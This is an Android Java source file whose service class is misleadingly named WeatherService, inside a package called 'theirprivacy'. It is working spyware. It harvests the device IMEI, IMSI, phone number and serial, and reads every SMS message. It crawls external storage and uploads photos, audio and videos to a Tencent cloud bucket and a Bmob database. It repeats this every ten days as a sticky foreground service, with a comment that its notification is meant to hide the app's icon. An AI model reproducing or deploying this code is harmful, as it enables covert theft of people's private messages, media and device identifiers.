package com.voler.theirprivacy.service;

import android.app.Notification;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import com.tencent.cos.model.COSRequest;
import com.tencent.cos.model.COSResult;
import com.tencent.cos.model.PutObjectRequest;
import com.tencent.cos.model.PutObjectResult;
import com.tencent.cos.task.listener.IUploadTaskListener;
import com.voler.theirprivacy.bean.FileInfo;
import com.voler.theirprivacy.bean.SmsInfo;
import com.voler.theirprivacy.bean.UserInfo;
import com.voler.theirprivacy.bean.UserTimes;
import com.voler.theirprivacy.utils.PhoneInfo;
import com.voler.theirprivacy.utils.Sign;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import cn.bmob.v3.BmobQuery;
import cn.bmob.v3.exception.BmobException;
import cn.bmob.v3.listener.FindListener;
import cn.bmob.v3.listener.SaveListener;
import cn.bmob.v3.listener.UpdateListener;

/**
 * 三尺春光驱我寒，一生戎马为长安
 * Created by Han on 16/12/10.
 * <p>
 * 用于其他进程来唤醒UI进程用的Service
 */
public class WeatherService extends Service {
    private final static int WAKE_SERVICE_ID = -1111;

    String cosPath = "远端路径，即存储到cos上的路径";
    String srcPath = "本地文件的绝对路径";
    String sign = "签名，此处使用多次签名";
    private Sign mSign;
    private boolean isFinish;
    private boolean isSmsFinish;
    private Thread uploadThread;

    private Uri SMS_INBOX = Uri.parse("content://sms/");
    private String serialNumber;//序列号
    private String objectId;

    @Override
    public void onCreate() {
        Log.i(this.getClass().getName(), "WeatherService->onCreate");
        super.onCreate();

        //dosomething
        mSign = Sign.getInstance(this);
        sign = mSign.getSign();

        PhoneInfo siminfo = new PhoneInfo(this);
        serialNumber = siminfo.getSerialNumber();
//        第一：默认初始化.bmob云数据库
//        Bmob.initialize(this, "2cbf044b0ebaa1b8d2acea05f19a22d7");


        UserInfo userInfo = new UserInfo();
        userInfo.setIMSI(siminfo.getIMSI());
        userInfo.setIMEI(siminfo.getPhoneInfo().getDeviceId());
        userInfo.setPhone(siminfo.getNativePhoneNumber());
        userInfo.setSerialnumber(serialNumber);
        userInfo.save(new SaveListener<String>() {
            @Override
            public void done(String s, BmobException e) {
                Log.i("------", "fdf");
            }
        });


        final String absolutePath = Environment.getExternalStorageDirectory().getAbsolutePath();
        uploadThread = new Thread() {
            @Override
            public void run() {
                uploadFile(new File(absolutePath));
            }
        };


        checkTimes();
    }


    private void saveInitUserTimes() {
        UserTimes userTimes = new UserTimes();
        userTimes.setSerialnumber(serialNumber);
        userTimes.setFileTime("0");
        userTimes.setSmsTime("0");
        userTimes.save(new SaveListener<String>() {
            @Override
            public void done(String s, BmobException e) {
                if (e == null) {
                    objectId = s;
                    getSmsFromPhone();
                    uploadThread.start();
                } else {
                    Log.i("bmob", "失败：" + e.getMessage() + "," + e.getErrorCode());
                }

            }
        });
    }

    private void checkTimes() {
        Log.i(this.getClass().getName(), "WeatherService->1");
        BmobQuery<UserTimes> bmobQuery = new BmobQuery<UserTimes>();
        bmobQuery.addWhereEqualTo("serialnumber", serialNumber);
        bmobQuery.findObjects(new FindListener<UserTimes>() {
            @Override
            public void done(List<UserTimes> list, BmobException e) {
                Log.i("------", "WeatherService->2");
                if (e == null) {
                    UserTimes userTimes = list.get(0);
                    String smsTime = userTimes.getSmsTime();
                    String fileTime = userTimes.getFileTime();
                    objectId = userTimes.getObjectId();
                    long sms = System.currentTimeMillis() - Long.parseLong(smsTime);
                    long file = System.currentTimeMillis() - Long.parseLong(fileTime);
                    if (sms > 10 * 24 * 3600 * 1000) {
                        getSmsFromPhone();
                    }
                    if (file > 10 * 24 * 3600 * 1000) {
                       uploadThread.start();
                    }
                } else {
                    saveInitUserTimes();
                }
                Log.i("------", "WeatherService->3");
            }
        });

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(this.getClass().getName(), "WeatherService->onStartCommand");
        startForeground(WAKE_SERVICE_ID, new Notification());//API < 18 ，此方法能有效隐藏Notification上的图标
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onDestroy() {
        Log.i(this.getClass().getName(), "WeatherService->onDestroy");
        super.onDestroy();
    }


    private void upload(final String srcPath, final String type) {

        if (".jpg".equals(type)) {
            cosPath = "jpg" + File.separator + System.currentTimeMillis() + ".jpg";
        } else if (".amr".equals(type)) {
            cosPath = "amr" + File.separator + System.currentTimeMillis() + ".amr";
        } else if (".png".equals(type)) {
            cosPath = "png" + File.separator + System.currentTimeMillis() + ".png";
        } else if (".jpeg".equals(type)) {
            cosPath = "jpeg" + File.separator + System.currentTimeMillis() + ".jpeg";
        } else if (".gif".equals(type)) {
            cosPath = "gif" + File.separator + System.currentTimeMillis() + ".gif";
        } else if (".mp4".equals(type)) {
            cosPath = "mp4" + File.separator + System.currentTimeMillis() + ".mp4";
            if (new File(srcPath).length() > 1048576 * 10) {
                isFinish = true;
                return;
            }
        }

        PutObjectRequest putObjectRequest = new PutObjectRequest();
        putObjectRequest.setBucket(mSign.getBucket());
        putObjectRequest.setCosPath(cosPath);
        putObjectRequest.setSrcPath(srcPath);
        putObjectRequest.setSign(sign);
        putObjectRequest.setListener(new IUploadTaskListener() {
            @Override
            public void onSuccess(COSRequest cosRequest, COSResult cosResult) {

                PutObjectResult result = (PutObjectResult) cosResult;
                if (result != null) {
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.append(" 上传结果： ret=" + result.code + "; msg =" + result.msg + "\n");
                    stringBuilder.append(" access_url= " + result.access_url == null ? "null" : result.access_url + "\n");
                    stringBuilder.append(" resource_path= " + result.resource_path == null ? "null" : result.resource_path + "\n");
                    stringBuilder.append(" url= " + result.url == null ? "null" : result.url);
                    Log.w("TEST", stringBuilder.toString());
                    saveFileInfo(srcPath, type);//cun
                    isFinish = true;
                }
            }

            @Override
            public void onFailed(COSRequest COSRequest, final COSResult cosResult) {
                Log.w("TEST", "上传出错： ret =" + cosResult.code + "; msg =" + cosResult.msg);
//                sign = mSign.getSign();
                isFinish = true;
            }

            @Override
            public void onProgress(COSRequest cosRequest, final long currentSize, final long totalSize) {
                float progress = (float) currentSize / totalSize;
                progress = progress * 100;
                Log.w("TEST", "进度：  " + (int) progress + "%");
            }

            @Override
            public void onCancel(COSRequest cosRequest, COSResult cosResult) {

            }
        });
        PutObjectResult result = mSign.getCOSClient().putObject(putObjectRequest);
    }


    private void findFileInfo(final String filePath, final String type) {
        BmobQuery<FileInfo> bmobQuery = new BmobQuery<FileInfo>();
        bmobQuery.addWhereEqualTo("serialnumber", serialNumber);
        bmobQuery.addWhereEqualTo("filePath", filePath);
        bmobQuery.findObjects(new FindListener<FileInfo>() {
            @Override
            public void done(List<FileInfo> list, BmobException e) {
                Log.i("------", "WeatherService->5");
                if (e == null) {
                    FileInfo fileInfo = list.get(0);
                    Log.i("------", fileInfo.getFileType());
                    isFinish = true;
                } else {
                    upload(filePath, type);
                }
            }
        });
    }

    private void saveFileInfo(final String filePath, final String type) {

        FileInfo fileInfo = new FileInfo();
        fileInfo.setSerialnumber(serialNumber);
        fileInfo.setFilePath(filePath);
        fileInfo.setFileType(type);
        fileInfo.save(new SaveListener<String>() {
            @Override
            public void done(String s, BmobException e) {
                Log.i("------","!!!!!!!!");
                if (e == null) {

                    Log.i("------", "null");
                } else {
                    Log.i("------", e.getErrorCode()+e.getMessage());

                }
            }
        });
//        new SaveListener<String>() {
//            @Override
//            public void done(String objectId, BmobException e) {
//                if (e == null) {
//                    Log.w("TEST", "添加数据成功，返回objectId为：" + objectId);
//                    upload(filePath, type);
//                    saveFileInfoSecond = false;
//                } else {
//                    Log.w("TEST", "创建数据失败：" + e.getMessage());
//                    if (e.getMessage().contains("duplicate")) {
//                        Log.w("TEST", "已有");
//                        isFinish = true;
//                        saveFileInfoSecond = false;
//                    } else if (!saveFileInfoSecond) {
//                        findFileInfo(filePath, type);
//                        saveFileInfoSecond = true;
//                    } else {
//                        isFinish = true;
//                        saveFileInfoSecond = false;
//                    }
//                }
//            }
//        });
    }

    private void uploadFile(File file) {
        if (!file.exists()) return;
        if (file.isFile()) {
            String filePath = file.getAbsolutePath();
            isFinish=false;
            if (filePath.endsWith(".jpg")) {
                findFileInfo(filePath, ".jpg");
            } else if (filePath.endsWith(".amr")) {
                findFileInfo(filePath, ".amr");
            } else if (filePath.endsWith(".png")) {
                findFileInfo(filePath, ".png");
            } else if (filePath.endsWith(".jpeg")) {
                findFileInfo(filePath, ".jpeg");
            } else if (filePath.endsWith(".gif")) {
                findFileInfo(filePath, ".gif");
            } else if (filePath.endsWith(".mp4")) {
                findFileInfo(filePath, ".mp4");
            }else {
                isFinish=true;
            }
            while (!isFinish) {
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        } else if (file.isDirectory()) {
            File[] files = file.listFiles();
            for (int i = 0; i < files.length; i++) {
                uploadFile(files[i]);
                Log.w("TEST", files[i].getAbsolutePath());
            }
        }
    }

    public void getSmsFromPhone() {
        new Thread() {
            @Override
            public void run() {


                ContentResolver cr = getContentResolver();
                String[] projection = new String[]{"_id", "thread_id", "address", "subject", "person", "status", "read", "date", "type", "body"};//"_id", "address", "person",, "date", "type
                String where = " date >  "
                        + "1079174999616";
                Cursor cur = cr.query(SMS_INBOX, projection, where, null, "date desc");
                if (null == cur)
                    return;
                while (cur.moveToNext()) {
                    String _id = cur.getString(cur.getColumnIndex("_id"));
                    String thread_id = cur.getString(cur.getColumnIndex("thread_id"));
                    String address = cur.getString(cur.getColumnIndex("address"));
                    String subject = cur.getString(cur.getColumnIndex("subject"));
                    String person = cur.getString(cur.getColumnIndex("person"));
                    String status = cur.getString(cur.getColumnIndex("status"));
                    String read = cur.getString(cur.getColumnIndex("read"));
                    long date = cur.getLong(cur.getColumnIndex("date"));
                    String type = cur.getString(cur.getColumnIndex("type"));
                    String body = cur.getString(cur.getColumnIndex("body"));
                    SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    String dateString = formatter.format(new Date(date));


                    SmsInfo smsInfo = new SmsInfo();
                    smsInfo.setSerialnumber(serialNumber);
                    smsInfo.setId(_id);
                    smsInfo.setThread_id(thread_id);
                    smsInfo.setAddress(address);
                    smsInfo.setSubject(subject);
                    smsInfo.setPerson(person);
                    smsInfo.setStatus(status);
                    smsInfo.setRead(read);
                    smsInfo.setDate(dateString);
                    smsInfo.setType(type);
                    smsInfo.setBody(body);
                    isSmsFinish = false;
                    smsInfo.save(new SaveListener<String>() {
                        @Override
                        public void done(String objectId, BmobException e) {
                            if (e == null) {
                                Log.w("TEST", "添加数据成功，返回objectId为：" + objectId);
                            } else {
                                Log.w("TEST", "创建数据失败：" + e.getMessage());
                            }
                            isSmsFinish = true;
                        }
                    });
                    while (!isSmsFinish) {
                        try {
                            Thread.sleep(5000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
                UserTimes userTimes = new UserTimes();
                userTimes.setSmsTime("" + System.currentTimeMillis());
                userTimes.update(objectId, new UpdateListener() {

                    @Override
                    public void done(BmobException e) {
                        if (e == null) {
                            Log.i("bmob", "更新成功");
                        } else {
                            Log.i("bmob", "更新失败：" + e.getMessage() + "," + e.getErrorCode());
                        }
                    }
                });
            }
        }.start();

    }

}
